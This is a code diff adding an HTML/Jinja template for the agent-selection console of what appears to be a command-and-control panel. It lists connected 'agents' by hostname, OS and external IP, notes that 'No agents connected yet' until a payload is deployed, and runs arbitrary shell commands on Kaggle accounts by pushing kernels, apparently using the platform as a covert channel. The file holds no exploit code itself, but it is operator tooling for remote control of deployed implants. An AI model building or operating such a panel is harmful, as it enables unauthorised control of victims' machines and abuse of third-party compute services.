@@ -1,0 +1,253 @@
+{% extends "base.html" %}
+{% block title %}Console{% endblock %}
+{% block page_title %}Console &mdash; Select Agent{% endblock %}
+{% block head %}
+<style>
+  #agentTable tbody tr, #kaggleTable tbody tr {
+    transition: all 0.2s ease;
+    cursor: pointer;
+  }
+  #agentTable tbody tr:hover, #kaggleTable tbody tr:hover {
+    background: rgba(0,212,255,0.06);
+  }
+  #agentTable tbody tr:hover td:first-child { border-left: none; }
+
+  .btn.sm.primary { transition: all 0.2s ease; position: relative; overflow: hidden; }
+  .btn.sm.primary:hover { box-shadow: 0 4px 15px rgba(0,212,255,0.3); }
+
+  #agentSearch:focus {
+    box-shadow: 0 0 0 3px rgba(0,212,255,0.15), 0 0 20px rgba(0,212,255,0.1);
+    border-color: var(--accent);
+  }
+
+  .badge { transition: all 0.2s ease; }
+  .badge:hover { filter: brightness(1.15); }
+
+  .dot-alive { animation: statusPulse 2s ease-in-out infinite; }
+  @keyframes statusPulse {
+    0%, 100% { box-shadow: 0 0 6px var(--green-glow); }
+    50% { box-shadow: 0 0 12px var(--green), 0 0 20px var(--green-glow); }
+  }
+
+  #kaggleSection { animation: fadeIn 0.3s ease-out; }
+
+  /* Agent count badge */
+  .agent-count-badge {
+    display: inline-flex; align-items: center; gap: 5px;
+    padding: 3px 10px; border-radius: 20px;
+    background: rgba(0,212,255,0.08); border: 1px solid rgba(0,212,255,0.2);
+    font-size: 10px; font-family: var(--font-mono); color: var(--accent);
+  }
+
+  /* Online/offline row highlight */
+  #agentTable tbody tr[data-alive="alive"] td:first-child { border-left: 2px solid transparent; }
+  #agentTable tbody tr[data-alive="dead"] { opacity: 0.6; }
+
+  .empty-state { animation: fadeIn 0.5s ease; }
+</style>
+{% endblock %}
+{% block topbar_actions %}
+<div style="display:flex;gap:8px;align-items:center">
+  <div style="position:relative">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:13px;height:13px;position:absolute;left:9px;top:50%;transform:translateY(-50%);color:var(--text-dim);pointer-events:none"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    <input type="text" id="agentSearch" placeholder="Search agents..." oninput="debouncedFilter()" style="width:220px;padding:6px 12px 6px 28px;font-size:12px;font-family:var(--font-mono)">
+  </div>
+  <select id="agentFilter" onchange="filterAgents()" style="padding:6px 10px;font-size:12px">
+    <option value="all">All</option>
+    <option value="alive">🟢 Online</option>
+    <option value="dead">🔴 Offline</option>
+  </select>
+  <span id="agentCountBadge" class="agent-count-badge"></span>
+  <button class="btn sm primary" onclick="loadKaggleAgents()">🔄 Kaggle</button>
+</div>
+{% endblock %}
+{% block content %}
+
+<!-- Kaggle Agents Section -->
+<div id="kaggleSection" class="card" style="padding:0;margin-bottom:16px;display:none">
+  <div style="padding:12px 16px;background:var(--card-hover);border-bottom:1px solid var(--border)">
+    <span style="font-weight:600;color:var(--accent)">Kaggle Agents (API Transport)</span>
+    <span style="font-size:11px;color:var(--text-muted);margin-left:8px">No internet required</span>
+  </div>
+  <table id="kaggleTable">
+    <thead><tr><th>Username</th><th>Dataset</th><th>Status</th><th>Quick Command</th><th>Actions</th></tr></thead>
+    <tbody id="kaggleBody"></tbody>
+  </table>
+</div>
+
+<div class="card" style="padding:0;overflow:auto">
+  <table id="agentTable">
+    <thead><tr><th style="width:30px"></th><th>Hostname</th><th>OS</th><th>IP</th><th>Group</th><th>Action</th></tr></thead>
+    <tbody>
+    {% for a in agents %}
+    <tr data-alive="{{ 'alive' if a.is_alive else 'dead' }}" data-search="{{ a.hostname }} {{ a.os }} {{ a.ip_external }} {{ a.group_name }}">
+      <td>{% if a.is_alive %}<span class="dot-alive pulse"></span>{% else %}<span class="dot-dead"></span>{% endif %}</td>
+      <td style="font-weight:500">{{ a.hostname or a.id[:12] }}</td>
+      <td><span class="badge os-{{ (a.os or 'unknown').split()[0]|lower }}">{{ a.os or '?' }}</span></td>
+      <td style="font-family:var(--font-mono);font-size:12px">{{ a.ip_external }}</td>
+      <td><span class="badge type" style="font-size:10px">{{ a.group_name or 'default' }}</span></td>
+      <td><a href="/console/{{ a.id }}" class="btn sm primary">Open Console</a></td>
+    </tr>
+    {% else %}
+    <tr id="emptyRow"><td colspan="6" class="empty-state">No agents connected yet. Deploy a payload to get started.</td></tr>
+    {% endfor %}
+    </tbody>
+  </table>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+let _filterTimer = null;
+function debouncedFilter() {
+  clearTimeout(_filterTimer);
+  _filterTimer = setTimeout(filterAgents, 150);
+}
+
+function filterAgents(){
+  const q = (document.getElementById('agentSearch').value||'').toLowerCase();
+  const f = document.getElementById('agentFilter').value;
+  let visible = 0, total = 0;
+  document.querySelectorAll('#agentTable tbody tr[data-search]').forEach(r=>{
+    total++;
+    const matchText = !q || r.dataset.search.toLowerCase().includes(q);
+    const matchStatus = f==='all' || r.dataset.alive===f;
+    const show = matchText && matchStatus;
+    r.style.display = show ? '' : 'none';
+    if (show) visible++;
+  });
+  const badge = document.getElementById('agentCountBadge');
+  if (badge) badge.textContent = visible === total ? `${total} agents` : `${visible}/${total}`;
+}
+
+// Init count
+document.addEventListener('DOMContentLoaded', () => {
+  filterAgents();
+  // Real-time agent status updates
+  socket.on('agent_update', data => {
+    if (data.action === 'register') {
+      showNotification(`New agent: ${data.hostname || data.id?.slice(0,8)}`, 'green');
+      // Add row dynamically instead of reload
+      const tbody = document.querySelector('#agentTable tbody');
+      if (tbody) {
+        const empty = document.getElementById('emptyRow');
+        if (empty) empty.remove();
+        const tr = document.createElement('tr');
+        tr.dataset.alive = 'alive';
+        tr.dataset.search = `${data.hostname||''} ${data.os||''} ${data.ip_external||''} ${data.group_name||''}`;
+        tr.style.animation = 'fadeIn 0.4s ease';
+        tr.innerHTML = `
+          <td><span class="dot-alive pulse"></span></td>
+          <td style="font-weight:500">${data.hostname || data.id?.slice(0,12) || '?'}</td>
+          <td><span class="badge os-${(data.os||'unknown').split(' ')[0].toLowerCase()}">${data.os||'?'}</span></td>
+          <td style="font-family:var(--font-mono);font-size:12px">${data.ip_external||'—'}</td>
+          <td><span class="badge type" style="font-size:10px">${data.group_name||'default'}</span></td>
+          <td><a href="/console/${data.id}" class="btn sm primary">Open Console</a></td>`;
+        tbody.prepend(tr);
+        filterAgents();
+      }
+    }
+    if (data.action === 'offline') {
+      const row = document.querySelector(`#agentTable tbody tr[data-search*="${data.hostname || ''}"]`);
+      if (row) {
+        row.dataset.alive = 'dead';
+        row.style.opacity = '0.6';
+        const dot = row.querySelector('.dot-alive');
+        if (dot) dot.className = 'dot-dead';
+        filterAgents();
+      }
+    }
+  });
+});
+
+// Kaggle Agents
+async function loadKaggleAgents() {
+  const section = document.getElementById('kaggleSection');
+  const body = document.getElementById('kaggleBody');
+  section.style.display = 'block';
+  body.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:20px">Loading...</td></tr>';
+  
+  try {
+    const r = await fetch('/api/kaggle/agents');
+    const data = await r.json();
+    
+    if (!data.agents || data.agents.length === 0) {
+      body.innerHTML = '<tr><td colspan="5" class="empty-state">No Kaggle accounts configured</td></tr>';
+      return;
+    }
+    
+    body.innerHTML = data.agents.map(u => `
+      <tr>
+        <td style="font-weight:500">${u}</td>
+        <td style="font-family:var(--font-mono);font-size:11px">${u}/gpu-resources</td>
+        <td><span class="badge" style="background:var(--accent);color:#000">API</span></td>
+        <td>
+          <input type="text" id="cmd-${u}" placeholder="whoami" style="width:150px;padding:4px 8px;font-size:11px;font-family:var(--font-mono">
+          <button class="btn sm" onclick="execKaggle('${u}')">▶ Run</button>
+        </td>
+        <td>
+          <button class="btn sm" onclick="statusKaggle('${u}')">Status</button>
+          <button class="btn sm" onclick="resultsKaggle('${u}')">Results</button>
+        </td>
+      </tr>
+    `).join('');
+  } catch(e) {
+    body.innerHTML = `<tr><td colspan="5" class="empty-state">Error: ${e.message}</td></tr>`;
+  }
+}
+
+async function execKaggle(username) {
+  const cmd = document.getElementById(`cmd-${username}`).value || 'whoami';
+  const btn = event.target;
+  const outId = `out-${username}`;
+  let outEl = document.getElementById(outId);
+  if (!outEl) {
+    outEl = document.createElement('div');
+    outEl.id = outId;
+    outEl.style.cssText = 'margin-top:6px;padding:8px;background:#000d18;border:1px solid var(--border);border-radius:6px;font-family:var(--font-mono);font-size:11px;color:var(--green);white-space:pre-wrap;max-height:120px;overflow:auto';
+    btn.closest('td').appendChild(outEl);
+  }
+  btn.disabled = true;
+  btn.textContent = '⏳';
+  outEl.style.color = 'var(--text-dim)';
+  outEl.textContent = 'Pushing kernel...';
+  try {
+    const r = await fetch('/api/kaggle/exec', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({username, type: 'shell', payload: cmd, timeout: 180})
+    });
+    const data = await r.json();
+    if (data.status === 'ok' && data.result) {
+      outEl.style.color = 'var(--green)';
+      outEl.textContent = `[${data.result.status}]\n${data.result.output}`;
+    } else {
+      outEl.style.color = 'var(--red)';
+      outEl.textContent = `Error: ${data.error || 'Unknown error'}`;
+    }
+  } catch(e) {
+    outEl.style.color = 'var(--red)';
+    outEl.textContent = `Error: ${e.message}`;
+  }
+  btn.disabled = false;
+  btn.textContent = '▶ Run';
+}
+
+async function statusKaggle(username) {
+  const r = await fetch(`/api/kaggle/status?username=${username}`);
+  const data = await r.json();
+  alert(`Status: ${data.status}`);
+}
+
+async function resultsKaggle(username) {
+  const r = await fetch(`/api/kaggle/results?username=${username}`);
+  const data = await r.json();
+  if (data.results) {
+    console.log(data.results);
+    alert(JSON.stringify(data.results, null, 2));
+  } else {
+    alert('No results');
+  }
+}
+</script>
+{% endblock %}
